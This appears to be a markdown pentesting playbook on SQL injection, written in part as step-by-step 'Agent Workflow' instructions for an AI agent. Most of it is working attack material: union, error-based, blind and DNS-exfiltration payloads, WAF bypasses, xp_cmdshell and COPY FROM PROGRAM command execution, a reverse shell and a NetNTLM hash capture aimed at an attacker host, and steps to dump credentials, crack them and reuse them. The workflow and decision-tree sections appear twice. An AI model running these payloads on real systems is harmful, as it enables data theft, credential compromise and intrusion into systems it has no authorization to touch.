# SQL Injection (SQLi)

> **Summary**: Inject malicious SQL statements into application queries via unsanitized user input.
> **Impact**: Data exfiltration, authentication bypass, data modification/deletion, remote code execution, full database compromise.
> **Typical Severity**: Critical

## Detection

### Indicators
- Application returns database error messages (syntax errors, type conversion errors)
- Different responses for `' AND 1=1--` vs `' AND 1=2--`
- Time delays when injecting sleep-based payloads
- Unusual data in HTTP responses after injecting UNION queries

### Automated Detection
```bash
# sqlmap from captured request
sqlmap -r request.txt -p <PARAMETER> --batch

# sqlmap against URL
sqlmap -u "http://<TARGET>/page?id=1" --batch --random-agent

# Burp Suite Active Scanner / SQLi-specific scan
```

### Manual Detection
```
# String-based detection
'
"
`
')
")
`)
'))
"))
`))

# Numeric detection
OR 1=1
OR 1=2
AND 1=1
AND 1=2

# Time-based detection
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
' || pg_sleep(5)--
```

## Exploitation

### Prerequisites
- User-controlled input reaches a SQL query without parameterization
- Ability to observe responses (inline) or infer data (blind)

### Injection Types

#### 1. Union-Based
Determine column count, then extract data via UNION SELECT.

```sql
-- Find column count
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY N-- -    -- increase until error

-- Find displayable columns
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 'a',NULL,NULL-- -

-- Extract data (MySQL example)
' UNION SELECT username,password,NULL FROM users-- -
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
```

#### 2. Error-Based

```sql
-- PostgreSQL
' AND 1=CAST((SELECT version()) AS INT)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--
' AND 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables) AS INT)--
';SELECT CAST(CAST(QUERY_TO_XML('SELECT <QUERY>',TRUE,TRUE,'') AS TEXT) AS INT)--

-- MSSQL
' AND 1=CONVERT(INT,(SELECT @@version))--
'+AND+1=user_name(@@version)--

-- MySQL
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND extractvalue(1,concat(0x7e,(SELECT version())))--

-- Oracle
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--
```

#### 3. Blind - Boolean-Based

```sql
' AND 1=1-- -    -- true condition (normal response)
' AND 1=2-- -    -- false condition (different response)

-- Extract data character by character
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96-- -
```

#### 4. Blind - Time-Based

| Database      | Payload                                                      |
| ------------- | ------------------------------------------------------------ |
| MSSQL         | `WAITFOR DELAY '0:0:10'`                                     |
| MySQL/MariaDB | `AND (SELECT SLEEP(10) FROM dual WHERE database() LIKE '%')` |
| PostgreSQL    | `\| (SELECT 1 FROM PG_SLEEP(10))`                            |
| Oracle        | `AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('RaNdStR',10)`           |

#### 5. Out-of-Band (DNS Exfiltration)

**MSSQL**:
```sql
DECLARE @T VARCHAR(1024);SELECT @T=(SELECT <DATA>);
EXEC('master..xp_dirtree "\\'+@T+'.<BURP_COLLABORATOR>\\x"');

-- Alternative functions
-- master..xp_fileexist, master..xp_subdirs, fn_get_audit_file, fn_trace_gettable
```

**PostgreSQL**:
```sql
copy (SELECT '') to program 'nslookup <DATA>.<BURP_COLLABORATOR>'
```

**MySQL**:
```sql
SELECT LOAD_FILE(CONCAT('\\\\',(<QUERY>),'.<BURP_COLLABORATOR>\\a'));
```

**Oracle**:
```sql
SELECT UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.<BURP_COLLABORATOR>/') FROM dual;
```

#### 6. Second-Order SQLi
Payload is stored in the database and executed in a different query context later.
```bash
# sqlmap second-order support
sqlmap -r login.txt -p username --second-url "http://<TARGET>/details.php"
sqlmap -r login.txt -p username --second-req details.txt
```

### Database-Specific Exploitation

#### MSSQL - RCE via xp_cmdshell
```sql
-- Check sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Enable xp_cmdshell
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';
```

#### MSSQL - NetNTLM Hash Capture
```sql
-- Trigger SMB auth to attacker (run Responder on attacker)
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share', 1, 1;
```
```bash
# Attacker side
sudo responder -I <INTERFACE>
hashcat -m 5600 '<CAPTURED_HASH>' /usr/share/wordlists/rockyou.txt
```

#### MSSQL - File Read
```sql
SELECT BulkColumn FROM OPENROWSET(BULK '<FILE_PATH>', SINGLE_CLOB) AS x
```

#### PostgreSQL - File Read/Write
```sql
-- Read with COPY
CREATE TABLE tmp(t TEXT); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp; DROP TABLE tmp;

-- Read with Large Objects
SELECT lo_import('/etc/passwd'); SELECT lo_get(<OID>);

-- Write with COPY
CREATE TABLE tmp(t TEXT); INSERT INTO tmp VALUES('<CONTENT>');
COPY tmp TO '/tmp/proof.txt'; DROP TABLE tmp;

-- RCE with COPY
CREATE TABLE tmp(t TEXT); COPY tmp FROM PROGRAM 'id'; SELECT * FROM tmp; DROP TABLE tmp;

-- RCE with Extensions
CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;
SELECT rev_shell('<ATTACKER_IP>', <PORT>);
```

## Bypasses

### WAF Bypass Techniques
```
-- Space bypass
/**/    instead of space
+       in URLs
%09     tab character
%0a     newline

-- Quote bypass
$$string$$          instead of 'string' (PostgreSQL)
CHAR(115,116,114)   instead of 'str'

-- Keyword bypass
SeLeCt              case variation
S%45LECT            URL encoding
SEL/**/ECT          inline comments
/*!SELECT*/         MySQL conditional comments

-- Equals bypass
LIKE instead of =
BETWEEN 1 AND 1

-- Comma bypass
OFFSET instead of LIMIT x,y
JOIN instead of comma in UNION
```

### UTF-8 Trick
Sites appending extra `'` can be bypassed with `\xc2` -- decoding of `\xc2'` (`\xc2\x27`) consumes the quote as a multi-byte sequence.

### sqlmap Tamper Scripts
```bash
sqlmap -u "<URL>" --tamper="between,randomcase,space2comment"

# Common tampers: between, randomcase, space2comment, charencode,
# equaltolike, greatest, apostrophemask, percentage
```

## Escalation
- **Data exfiltration** --> dump entire database
- **Authentication bypass** --> login as admin with `' OR 1=1-- -`
- **Privilege escalation** --> read credentials, access other databases
- **OS command execution** --> xp_cmdshell (MSSQL), COPY FROM PROGRAM (PostgreSQL)
- **File read/write** --> access server filesystem
- **Lateral movement** --> MSSQL linked servers, AD enumeration via `SUSER_SNAME()`

## Tools

| Tool | Usage |
|------|-------|
| [sqlmap](https://github.com/sqlmapproject/sqlmap) | `sqlmap -r req.txt -p <PARAM> --batch --risk=3 --level=5` |
| [Atlas](https://github.com/m4ll0k/Atlas) | sqlmap tamper suggestion tool |
| Burp Suite Intruder | Manual payload fuzzing and response comparison |
| [ghauri](https://github.com/r0oth3x49/ghauri) | Advanced SQL injection detection and exploitation |
| [jSQL Injection](https://github.com/ron190/jsql-injection) | Java-based automatic SQL injection tool |
| `psql` | `psql -h <HOST> -U <USER> <DB>` -- direct PostgreSQL interaction |

### sqlmap Quick Reference
```bash
# From Burp request file
sqlmap -r request.txt -p <PARAM> --batch

# GET parameter
sqlmap -u "http://<TARGET>/page?id=1" -p id

# POST data
sqlmap -u "http://<TARGET>/page" --data="user=admin&pass=test" --method=POST

# Cookie injection
sqlmap -u "http://<TARGET>/page" --cookie="session=*"

# Header injection
sqlmap -u "http://<TARGET>/page" --headers="X-Forwarded-For:127.0.0.1*"

# Specify technique (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=OOB)
sqlmap -u "<URL>" --technique="BEU" --batch

# Database enumeration
sqlmap -u "<URL>" --dbs
sqlmap -u "<URL>" -D <DB> --tables
sqlmap -u "<URL>" -D <DB> -T <TABLE> --dump

# OS shell
sqlmap -u "<URL>" --os-shell
```

## Agent Workflow
> Step-by-step instructions for an AI agent to test for this vulnerability.

### Phase 1: Discovery

1. **Identify injectable parameters**
   ```bash
   # Discover parameters from web archives and crawling
   paramspider -d <TARGET_DOMAIN> --output paramspider_output.txt
   gau <TARGET_DOMAIN> --threads 5 --o gau_output.txt
   katana -u <TARGET_URL> -d 3 -jc -o katana_output.txt

   # Merge, deduplicate, and filter for parameterized URLs
   cat paramspider_output.txt gau_output.txt katana_output.txt | uro | grep "=" | sort -u > params.txt

   # Discover hidden parameters
   arjun -u <TARGET_URL> --stable -oT arjun_output.txt
   ```
   - **Expected output**: List of URLs with query parameters (e.g., `?id=1`, `?search=test`, `?user=admin`).
   - **Decision**: If no parameterized URLs found, test POST body parameters, JSON fields, cookie values, and HTTP headers (`X-Forwarded-For`, `User-Agent`, `Referer`).

2. **Send initial probe payloads**
   - For each parameter, submit:
     - `'` (single quote) -- look for SQL syntax errors in the response
     - `"` (double quote)
     - `1 OR 1=1-- -` vs `1 OR 1=2-- -` -- look for response differences
     - `1' AND '1'='1` vs `1' AND '1'='2` -- boolean condition
   - **Expected output**: Database error messages (e.g., `You have an error in your SQL syntax`, `unterminated quoted string`, `ORA-`, `Microsoft OLE DB`), or differing responses between true/false conditions.
   - **Decision**: If error messages appear, proceed to Phase 2 (error-based). If responses differ between true/false, proceed to Phase 2 (boolean-blind). If neither, test time-based.

3. **Test time-based detection** (if no visible errors or boolean differences):
   ```
   ' AND SLEEP(5)-- -          (MySQL)
   '; WAITFOR DELAY '0:0:5'--  (MSSQL)
   ' || pg_sleep(5)--          (PostgreSQL)
   ```
   - **Expected output**: Response takes ~5 seconds longer.
   - **Decision**: If delay observed, proceed to Phase 2 (time-based blind). If no delay, test OOB or move to next parameter.

### Phase 2: Validation

4. **Determine injection type and DBMS**

   - **If** SQL error messages were returned:
     - Parse error message to identify DBMS (MySQL, PostgreSQL, MSSQL, Oracle, SQLite).
     - Confirm with: `' AND 1=CAST((SELECT version()) AS INT)--` (PostgreSQL) or `' AND extractvalue(1,concat(0x7e,(SELECT version())))--` (MySQL).
     - **Result**: Error-based injection confirmed.

   - **If** boolean differences observed:
     - Confirm with: `' AND 1=1-- -` (normal) vs `' AND 1=2-- -` (different).
     - Test UNION column count: `' ORDER BY 1-- -`, `' ORDER BY 2-- -`, ... until error.
     - **If** UNION columns determined: Union-based injection confirmed.
     - **If** UNION fails but boolean works: Boolean-blind injection confirmed.

   - **If** time delay observed:
     - Confirm repeatability (test delay twice to rule out network latency).
     - Time-based blind injection confirmed.

   - **If** none of the above work, test OOB:
     ```sql
     -- MSSQL
     EXEC master..xp_dirtree '\\<BURP_COLLABORATOR>\test'
     -- MySQL
     SELECT LOAD_FILE(CONCAT('\\\\',version(),'.<BURP_COLLABORATOR>\\a'))
     -- PostgreSQL
     copy (SELECT '') to program 'nslookup <BURP_COLLABORATOR>'
     ```
     - **Decision**: If Burp Collaborator receives DNS callback, OOB injection confirmed.

5. **Run sqlmap to confirm and fingerprint**
   ```bash
   # From a captured Burp request file
   sqlmap -r request.txt -p <PARAMETER> --batch --random-agent --level=3 --risk=2

   # Or against URL directly
   sqlmap -u "<TARGET_URL>?<PARAM>=1" --batch --random-agent
   ```
   - **Expected output**: sqlmap identifies the injection point, DBMS type, and available techniques.

### Phase 3: Exploitation

6. **Extract data with sqlmap** using the appropriate technique:
   ```bash
   # Enumerate databases
   sqlmap -r request.txt -p <PARAMETER> --batch --dbs

   # Enumerate tables in target database
   sqlmap -r request.txt -p <PARAMETER> --batch -D <DATABASE> --tables

   # Enumerate columns in target table
   sqlmap -r request.txt -p <PARAMETER> --batch -D <DATABASE> -T <TABLE> --columns

   # Dump data
   sqlmap -r request.txt -p <PARAMETER> --batch -D <DATABASE> -T <TABLE> --dump

   # Specify technique if needed (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=OOB)
   sqlmap -r request.txt -p <PARAMETER> --batch --technique=<TECHNIQUES> --dbms=<DBMS>
   ```
   - **Expected output**: Database names, table names, column names, and data rows (usernames, passwords, emails, etc.).

7. **If WAF is blocking sqlmap**, apply tamper scripts:
   ```bash
   sqlmap -r request.txt -p <PARAMETER> --batch --tamper="between,randomcase,space2comment" --random-agent
   ```

8. **Read sensitive files** (if the DBMS supports it):
   ```bash
   # MySQL
   sqlmap -r request.txt -p <PARAMETER> --file-read="/etc/passwd"

   # MSSQL
   sqlmap -r request.txt -p <PARAMETER> --sql-query="SELECT BulkColumn FROM OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB) AS x"
   ```

### Phase 4: Escalation

9. **Attempt RCE via database features**
   ```bash
   # sqlmap OS shell (attempts xp_cmdshell for MSSQL, UDF for MySQL, COPY FROM PROGRAM for PostgreSQL)
   sqlmap -r request.txt -p <PARAMETER> --batch --os-shell

   # sqlmap OS command
   sqlmap -r request.txt -p <PARAMETER> --batch --os-cmd="whoami"
   ```

10. **MSSQL-specific escalation**:
    ```sql
    -- Enable xp_cmdshell
    EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
    EXEC xp_cmdshell 'whoami';

    -- Capture NetNTLM hash
    EXEC master..xp_dirtree '\\<ATTACKER_IP>\share';
    ```
    - On attacker: `sudo responder -I <INTERFACE>` to capture the hash, then crack with `hashcat -m 5600`.

11. **PostgreSQL-specific escalation**:
    ```sql
    -- RCE via COPY FROM PROGRAM
    CREATE TABLE tmp(t TEXT); COPY tmp FROM PROGRAM 'id'; SELECT * FROM tmp; DROP TABLE tmp;
    ```

12. **Lateral movement**: Use extracted credentials to access other systems. For MSSQL, enumerate linked servers and Active Directory via `SUSER_SNAME()`.

## Decision Tree

```
START: Inject ' and " into each parameter
  |
  +-- SQL error message returned?
  |     |
  |     +-- YES --> Identify DBMS from error
  |     |            +-- Try error-based extraction (CAST, extractvalue, CONVERT)
  |     |            +-- Works? --> Extract data via error-based SQLi
  |     |            +-- Fails? --> Fall through to UNION test
  |     |
  |     +-- NO --> Test boolean conditions (AND 1=1 vs AND 1=2)
  |
  +-- Response differs between true/false conditions?
  |     |
  |     +-- YES --> Test UNION column count (ORDER BY N)
  |     |            +-- Column count found? --> UNION-based extraction
  |     |            +-- UNION blocked? --> Boolean-blind extraction
  |     |            |     +-- Use sqlmap --technique=B or manual binary search
  |     |
  |     +-- NO --> Test time-based (SLEEP/WAITFOR/pg_sleep)
  |
  +-- Response delayed by ~5 seconds?
  |     |
  |     +-- YES --> Time-based blind injection confirmed
  |     |            +-- Use sqlmap --technique=T --dbms=<DBMS>
  |     |
  |     +-- NO --> Test OOB (xp_dirtree, LOAD_FILE to Collaborator)
  |
  +-- Burp Collaborator receives DNS callback?
  |     |
  |     +-- YES --> OOB injection confirmed
  |     |            +-- Exfiltrate data via DNS (concat data into subdomain)
  |     |
  |     +-- NO --> No SQLi found for this parameter, test next one
  |
  === POST-EXTRACTION ===
  |
  +-- Data extracted successfully?
        +-- YES --> Attempt RCE escalation
        |     +-- MSSQL? --> xp_cmdshell + NetNTLM capture
        |     +-- PostgreSQL? --> COPY FROM PROGRAM
        |     +-- MySQL? --> UDF or --os-shell
        |     +-- Other? --> File read/write as fallback
        +-- NO --> Try different technique or tamper scripts
```

## Success Criteria

- **Confirmed SQLi**: sqlmap identifies the injection point, OR manual boolean/time/error probes produce distinct responses.
- **Data extracted**: Database names, table schemas, and row data (usernames, password hashes, etc.) retrieved.
- **Authentication bypass**: Login as admin with `' OR 1=1-- -` or equivalent payload.
- **File read confirmed**: Contents of `/etc/passwd`, `web.config`, or other sensitive files retrieved.
- **RCE achieved**: `--os-shell` returns command output, or `xp_cmdshell`/`COPY FROM PROGRAM` executes system commands.
- **Lateral movement**: Captured NetNTLM hash cracked, or credentials reused on other services.

---

## Agent Workflow
> Step-by-step instructions for an AI agent to test for SQL injection.

### Phase 1: Discovery
1. Identify all input vectors: URL parameters, POST body, cookies, HTTP headers (User-Agent, Referer, X-Forwarded-For), and JSON/XML fields.
2. Note the database type from error messages, headers, or technology stack (MySQL, PostgreSQL, MSSQL, Oracle, SQLite).
3. Map all endpoints that interact with a database: login, search, profile, filtering, sorting, and any data retrieval features.

### Phase 2: Validation
1. **Error-based detection** -- inject `'`, `"`, `)`, `'))` in each parameter and check for SQL syntax errors in the response.
2. **Boolean-based detection** -- compare responses between true and false conditions:
   ```
   ?id=1 AND 1=1-- -   (TRUE -- normal response)
   ?id=1 AND 1=2-- -   (FALSE -- different response)
   ```
3. **Time-based detection** -- inject sleep payloads and measure response time:
   ```
   ' AND SLEEP(5)-- -          (MySQL)
   '; WAITFOR DELAY '0:0:5'--  (MSSQL)
   ' || pg_sleep(5)-- -        (PostgreSQL)
   ```
4. **Automated scan** -- run sqlmap against the suspected parameter:
   ```bash
   sqlmap -u "http://<TARGET>/page?id=1" --batch --random-agent
   ```

### Phase 3: Exploitation
1. **UNION-based extraction** -- determine column count with `ORDER BY` and extract data:
   ```
   ?id=1 UNION SELECT NULL,NULL,NULL-- -
   ?id=1 UNION SELECT username,password,NULL FROM users-- -
   ```
2. **Blind extraction** -- use boolean or time-based techniques to extract data character by character:
   ```bash
   sqlmap -u "http://<TARGET>/page?id=1" --technique=BT --dump -T users
   ```
3. **File read** -- read server files through SQL injection:
   ```
   ?id=1 UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -   (MySQL)
   ```
4. **RCE** -- escalate to command execution:
   ```bash
   sqlmap -u "http://<TARGET>/page?id=1" --os-shell
   # Or via MSSQL xp_cmdshell, PostgreSQL COPY FROM PROGRAM
   ```

### Phase 4: Escalation
1. Dump all database credentials and test for password reuse on other services (SSH, admin panels, APIs).
2. Read sensitive configuration files (`/etc/passwd`, `web.config`, `.env`) via database file-read functions.
3. Achieve RCE via `--os-shell`, `xp_cmdshell`, `COPY FROM PROGRAM`, or `INTO OUTFILE` webshell.
4. Capture NetNTLM hashes on MSSQL via `xp_dirtree` to a Responder listener.

## Decision Tree

```
Start: Identify input parameters that interact with the database
  |
  +---> Error in response after injecting '?
  |       +---> Yes: Error-based SQLi confirmed --> Identify DB type from error
  |       +---> No: Test boolean-based (AND 1=1 vs AND 1=2)
  |
  +---> Boolean differential response?
  |       +---> Yes: Boolean-based blind SQLi --> Extract via substring/ascii
  |       +---> No: Test time-based (SLEEP/WAITFOR/pg_sleep)
  |
  +---> Time delay observed?
  |       +---> Yes: Time-based blind SQLi --> Extract via conditional sleep
  |       +---> No: Test UNION-based (ORDER BY column count)
  |
  +---> DB type identified?
          +---> MySQL: LOAD_FILE, INTO OUTFILE, SLEEP
          +---> MSSQL: xp_cmdshell, xp_dirtree, WAITFOR DELAY
          +---> PostgreSQL: COPY FROM PROGRAM, pg_read_file, pg_sleep
          +---> Oracle: UTL_HTTP, DBMS_PIPE, extractvalue
          +---> SQLite: ATTACH DATABASE, load_extension
```

## Success Criteria
- [ ] Injectable parameter identified with confirmed SQL injection type (error/boolean/time/UNION)
- [ ] Database type and version determined
- [ ] Data extracted: database names, table schemas, and sensitive records (credentials, PII)
- [ ] If file read: sensitive server files retrieved
- [ ] If RCE: OS command execution confirmed via database functions

## References
- [sqlmap project](https://github.com/sqlmapproject/sqlmap)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [PortSwigger - SQL Injection](https://portswigger.net/web-security/sql-injection)

## See Also
- [NoSQL Injection](nosql.md)
- [Command Injection](command-injection.md)
